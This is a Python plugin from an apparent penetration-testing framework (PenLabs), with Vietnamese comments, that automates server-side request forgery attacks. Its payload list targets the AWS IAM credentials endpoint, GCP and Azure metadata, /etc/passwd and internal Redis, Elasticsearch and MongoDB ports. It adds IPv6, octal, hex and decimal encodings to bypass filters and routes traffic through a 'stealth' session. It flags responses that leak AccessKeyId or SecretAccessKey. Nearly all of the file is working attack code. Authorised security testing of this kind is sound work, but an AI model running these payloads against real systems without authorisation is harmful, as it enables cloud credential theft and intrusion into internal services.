"""
PenLabs V1.0 — SSRF Probe Plugin
Quét SSRF (Server-Side Request Forgery) bằng OOB callbacks.
Hỗ trợ Cloud metadata bypass, IPv6, Octal encoding.
"""
import os
import re
import json
import shutil
import logging
import requests
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from core.base_plugin import BasePlugin
from core.evidence import attach_evidence, make_evidence

logger = logging.getLogger(__name__)

# Tham số phổ biến dễ bị SSRF
SSRF_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "return", "next",
    "site", "html", "data", "reference", "ref", "page", "host",
    "callback", "feed", "to", "out", "view", "dir", "show",
    "navigation", "open", "domain", "source", "val", "validate",
    "link", "img", "filename", "file", "document", "folder",
    "root", "load", "target", "proxy", "port", "fetch",
]


class SSRFProbePlugin(BasePlugin):
    def name(self) -> str:
        return "SSRFProbe"

    def description(self) -> str:
        return "SSRF Probe — Quét Server-Side Request Forgery bằng OOB callbacks (Interactsh/custom)."

    def check_installed(self) -> bool:
        return True  # Built-in Python, không cần tool ngoài

    def run(self, urls: list, out_dir: str = "/tmp",
            headers: dict = None, interactsh_url: str = "",
            timeout_per_url: int = 10, max_urls: int = 50,
            scope_rules: list = None, proxy_mode: str = "fuzz") -> list:
        """
        Quét SSRF trên danh sách URLs.
        """
        os.makedirs(out_dir, exist_ok=True)
        findings = []
        tested = 0

        #  Use StealthNet session for unified fingerprinting
        from plugins.stealth_net_plugin import StealthNetPlugin
        stealth_net = StealthNetPlugin(scan_mode=proxy_mode)
        stealth_net.run()
        session = stealth_net._session

        if headers:
            session.headers.update(headers)

        # [AUDIT-FIX S-01] Scope validation — filter out-of-scope URLs trước khi probe
        if scope_rules:
            try:
                from utils.scope_engine import ScopeEngine
                scope = ScopeEngine(rules=scope_rules)
                original_count = len(urls)
                urls = [u for u in urls if scope.is_in_scope(urlparse(u).hostname or "")]
                if len(urls) < original_count:
                    logger.info(f"[SSRFProbe] Scope filter: {original_count} → {len(urls)} URLs in-scope")
            except ImportError:
                logger.debug("[SSRFProbe] ScopeEngine not available, skipping scope validation")

        # Nếu không có interactsh URL, dùng canary domain để detect blind SSRF
        callback_domain = interactsh_url or "ssrf-canary.pentools.internal"
        
        # === PAYLOAD TEMPLATES ===
        def _build_payloads(cb_domain):
            return [
                # Direct callback
                f"http://{cb_domain}/ssrf-direct",
                f"https://{cb_domain}/ssrf-direct",
                # AWS metadata
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                # GCP metadata
                "http://metadata.google.internal/computeMetadata/v1/",
                # Azure metadata
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                # IPv6 bypass
                "http://[::ffff:169.254.169.254]/latest/meta-data/",
                "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/",
                # Octal bypass
                "http://0251.0376.0251.0376/latest/meta-data/",
                # Hex bypass
                "http://0xa9fea9fe/latest/meta-data/",
                # Decimal bypass
                "http://2852039166/latest/meta-data/",
                # Local file read
                "file:///etc/passwd",
                "file:///etc/hostname",
                # Internal port scan
                "http://127.0.0.1:80/",
                "http://127.0.0.1:8080/",
                "http://127.0.0.1:6379/",  # Redis
                "http://127.0.0.1:9200/",  # Elasticsearch
                "http://127.0.0.1:27017/", # MongoDB
            ]

        payloads = _build_payloads(callback_domain)

        for url in urls[:max_urls]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            # Test existing params
            for param_name in params:
                if tested >= max_urls * len(payloads):
                    break
                for payload in payloads:
                    try:
                        # Replace param value with payload
                        test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                        test_params[param_name] = payload
                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urlencode(test_params), parsed.fragment
                        ))
                        
                        resp = session.get(
                            test_url,
                            headers=headers or {},
                            timeout=timeout_per_url,
                            allow_redirects=False # [V1.0-APEX] Ngăn chặn redirect để tránh Soft-200
                        )
                        tested += 1

                        # === V1.0: DETECTION LOGIC (Precision-first) ===
                        is_ssrf = False
                        evidence = ""

                        # [V1.0-APEX] Chống Soft-200: Lấy fingerprint trang lỗi nếu cần
                        if resp.status_code == 200 and len(resp.text) > 1000:
                            # Nếu response quá giống trang index/login (hardcoded heuristic)
                            if "login" in resp.text.lower() or "<!doctype html>" in resp.text.lower()[:100]:
                                if "root:x:0:0" not in resp.text: # passwd bypass
                                    continue 

                        body = resp.text
                        body_lower = body.lower()

                        # Check 1: /etc/passwd thực sự (phải có root entry đúng format)
                        if "root:x:0:0:" in body and ":/bin/" in body:
                            is_ssrf = True
                            evidence = "Response contains valid /etc/passwd entries"

                        # Check 2: AWS Metadata — phải trả JSON có cấu trúc IAM chuẩn
                        # Tránh match chuỗi "iam" trong HTML bình thường
                        if not is_ssrf and "169.254" in payload:
                            try:
                                meta_json = resp.json()
                                # AWS IAM credentials response luôn có Code + Type + AccessKeyId
                                if isinstance(meta_json, dict) and (
                                    ("Code" in meta_json and "Type" in meta_json) or
                                    "AccessKeyId" in meta_json or
                                    "SecretAccessKey" in meta_json
                                ):
                                    is_ssrf = True
                                    evidence = f"AWS Metadata JSON structure confirmed: keys={list(meta_json.keys())[:5]}"
                            except (ValueError, Exception):
                                # Không phải JSON → kiểm tra raw text metadata
                                # AWS /latest/meta-data/ trả list text như "ami-id\ninstance-id\n..."
                                if resp.status_code == 200 and len(body) < 2000:
                                    aws_markers = ["ami-id", "instance-id", "security-credentials"]
                                    matched_markers = [m for m in aws_markers if m in body_lower]
                                    if len(matched_markers) >= 2:
                                        is_ssrf = True
                                        evidence = f"AWS metadata directory listing: {matched_markers}"

                        # Check 3: GCP Metadata (yêu cầu header Metadata-Flavor: Google)
                        if not is_ssrf and "metadata.google" in payload:
                            if resp.status_code == 200:
                                flavor = resp.headers.get("Metadata-Flavor", "")
                                if flavor == "Google":
                                    is_ssrf = True
                                    evidence = "GCP Metadata-Flavor: Google header confirmed"

                        # Check 4: Internal service — chỉ match nếu response rất nhỏ (< 5KB)
                        # và chứa banner chuẩn, tránh match trong HTML lớn
                        if not is_ssrf and resp.status_code == 200 and len(body) < 5000:
                            internal_sigs = {
                                "redis_version": "Redis",
                                '"cluster_name"': "Elasticsearch",
                                '"tagline":"You Know, for Search"': "Elasticsearch",
                            }
                            for sig, svc_name in internal_sigs.items():
                                if sig in body:
                                    is_ssrf = True
                                    evidence = f"Internal service '{svc_name}' banner detected in small response"
                                    break

                        if is_ssrf:
                            finding = {
                                "url": url,
                                "param": param_name,
                                "payload": payload,
                                "status_code": resp.status_code,
                                "evidence": evidence,
                                "severity": "critical" if "169.254" in payload or "metadata" in payload else "high",
                                "response_length": len(resp.text),
                                "finding_type": "ssrf",
                                "matched_at": url,
                                "confidence": "high",
                                "source": "ssrf_probe",
                            }
                            findings.append(attach_evidence(finding, make_evidence(
                                method="GET",
                                url=test_url,
                                param=param_name,
                                payload=payload,
                                status_code=resp.status_code,
                                request_headers=headers or {},
                                response_headers=dict(resp.headers),
                                response_snippet=resp.text,
                                validation=evidence,
                                confidence="high",
                            )))
                            logger.warning(f"[SSRF] {finding['severity']}: {url} param={param_name} payload={payload}")

                    except Exception:
                        continue

            # Test bổ sung: thử inject SSRF params vào URL không có params
            if not params:
                base_url = url.rstrip("/")
                for ssrf_param in SSRF_PARAMS[:10]:  # Top 10 common params
                    for payload in payloads[:5]:  # Top 5 payloads
                        try:
                            test_url = f"{base_url}?{ssrf_param}={payload}"
                            resp = session.get(
                                test_url, headers=headers or {},
                                timeout=timeout_per_url
                            )
                            tested += 1
                            body = resp.text.lower()
                            for indicator in ["ami-id", "instance-id", "root:x:0:0"]:
                                if indicator in body:
                                    finding = {
                                        "url": url, "param": ssrf_param,
                                        "payload": payload, "status_code": resp.status_code,
                                        "evidence": f"Cloud metadata indicator '{indicator}'",
                                        "severity": "critical",
                                        "finding_type": "ssrf",
                                        "matched_at": url,
                                        "confidence": "high",
                                        "source": "ssrf_probe",
                                    }
                                    findings.append(attach_evidence(finding, make_evidence(
                                        method="GET",
                                        url=test_url,
                                        param=ssrf_param,
                                        payload=payload,
                                        status_code=resp.status_code,
                                        request_headers=headers or {},
                                        response_headers=dict(resp.headers),
                                        response_snippet=resp.text,
                                        validation=f"Cloud metadata indicator '{indicator}' present in response",
                                        confidence="high",
                                    )))
                                    break
                        except Exception:
                            continue

        # Save results
        out_file = os.path.join(out_dir, "ssrf_findings.json")
        with open(out_file, "w") as f:
            json.dump(findings, f, indent=2, default=str)

        logger.info(f"[SSRFProbe] Tested {tested} payloads, found {len(findings)} SSRF issues.")
        return findings
